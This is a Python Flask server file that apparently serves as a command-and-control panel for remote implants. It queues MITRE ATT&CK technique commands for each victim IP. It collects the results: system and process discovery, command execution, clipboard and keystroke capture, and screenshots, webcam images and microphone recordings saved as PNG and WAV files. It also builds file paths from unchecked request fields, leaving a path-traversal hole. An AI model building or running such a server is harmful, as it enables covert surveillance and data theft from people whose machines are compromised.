from flask import Flask, render_template, request, redirect, abort
from datetime import datetime
from base64 import b64decode,b64encode
import db, json, os


app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 1024*1024

def res_post():
    print(request)
    try:
        os.mkdir(f'./results/{request.form['ip']}')
    except:
        pass
    not_streamed_not_filed = ['T1082', 'T1059', 'T1083', 'T1057','T1115', 'T1056']
    if request.form['tactic'].upper() in not_streamed_not_filed:

        with open(f'./results/{request.form['ip']}/{request.form['tactic'].upper()}.json', 'w') as fl:
            json.dump(dict(request.form), fl)
    elif request.form['tactic'].upper()=="T1113" or request.form['tactic'].upper()=='T1125':
        with open(f'./results/{request.form['ip']}/{datetime.now().timestamp()}.png','wb') as fl:
            fl.write(b64decode(request.form['data']))
    else:
        if request.form['tactic'].upper()=='T1123':
            with open(f'./results/{request.form['ip']}/{datetime.now().timestamp()}.wav', 'wb') as fl:
                fl.write(b64decode(request.form['data']))

@app.route('/')
@app.route('/index.html')
def home():
    return render_template('index.html')

@app.route('/results.html', methods=['GET','POST'])
def results():
    if request.method=='POST':
        db.change(request.form['ip'],'command',None)
        db.change(request.form['ip'],'additional',None)
        res_post()
        return '',200
    else:
        return render_template('result.html')

@app.route('/is_ok', methods=['GET','POST'])
def is_ok_page():
    db.change(request.form['ip'])
    return '',200

@app.route('/data.json')
def give_data():
    with open('clients.json','r') as fl:
        return fl.read(), 200, {'Content-Type': 'application/json'}

@app.route('/throw_command', methods=['POST'])
def throw_command():
    if request.form['host']:
        db.change(request.form['host'],subkey='command',data=request.form['tactic'])
        if 'add_data' in request.form.keys():
            db.change(request.form['host'],subkey='additional',data=request.form['add_data'])
    return redirect('index.html')

@app.route('/get_tactic/<string:ip_addr>', methods=['GET'])
def get_tactic(ip_addr):
    print(ip_addr)
    command = db.select(ip_addr,'command')
    if command == None:
        return abort(404)
    else:
        add_data = db.select(ip_addr,'additional')
        ret = {"tactic":command}
        if add_data:
            ret["add_data"] = add_data
        
        return json.dumps(ret), {'Content-Type': 'application/json'}
        
@app.route('/get_results', methods=['GET'])
def get_results():
    try:
        with open(f"./results/{request.args.get('host')}/{request.args.get('tactic')}.json", 'r') as fl:
            return fl.read(), 200, {'Content-Type': 'application/json'}
    except:
        return ''

@app.route('/get_files', methods=['GET', 'POST'])
def get_files():
    pass